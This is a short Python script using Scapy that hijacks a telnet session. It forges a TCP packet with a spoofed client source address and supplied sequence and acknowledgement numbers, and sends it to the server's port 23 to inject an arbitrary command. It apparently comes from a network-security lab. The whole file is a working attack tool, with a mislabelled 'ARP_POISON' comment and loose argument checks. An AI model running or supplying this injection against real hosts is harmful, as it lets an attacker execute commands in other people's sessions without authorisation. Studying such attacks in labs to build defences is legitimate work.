#!/usr/bin/python3
from scapy.all import *
import os
import sys

def get_cmd_arguments():
    Args = None
    # Ensure that the user has specified 12 arguments
    if len(sys.argv) != 12:
        print("Error!!!!! You specified less or more than 12 arguments")
        return Args
    elif sys.argv[1]=='-c' and sys.argv[3]=='-s' and sys.argv[5]=='-sp' and sys.argv[7]=='-seq' and sys.argv[9]=='-ack':
        try:
            L = []
            L.append(sys.argv[2])
            L.append(sys.argv[4])
            L.append(sys.argv[6])
            L.append(sys.argv[8])
            L.append(sys.argv[10])
            L.append(sys.argv[11])
            Args = L
        except:
            print("Invalid command-line arguments, check the documentation and try again")

    return Args

def hijacking(client_ip , server_ip , sp , seqN ,ackN, cmd):
    #Build the telnet packet
    IPLayer = IP(src = client_ip ,dst = server_ip)
    TCPLayer = TCP(sport = int(sp) ,dport = 23,flags = "PA",seq = int(seqN),ack = int(ackN))
    data = cmd+"\n"
    telnet_data = data.encode('ascii')
    telnet_pkt = IPLayer/TCPLayer/telnet_data
    send(telnet_pkt)





#verify and get arguments
Args = get_cmd_arguments()

#ARP_POISON function
hijacking(Args[0],Args[1],Args[2],Args[3],Args[4],Args[5])
"""Args[0]----->client_ip
   Args[1]----->server_ip
   Args[2]----->port
   Args[3]----->seq
   Args[4]----->ack
   Args[5]----->command
"""
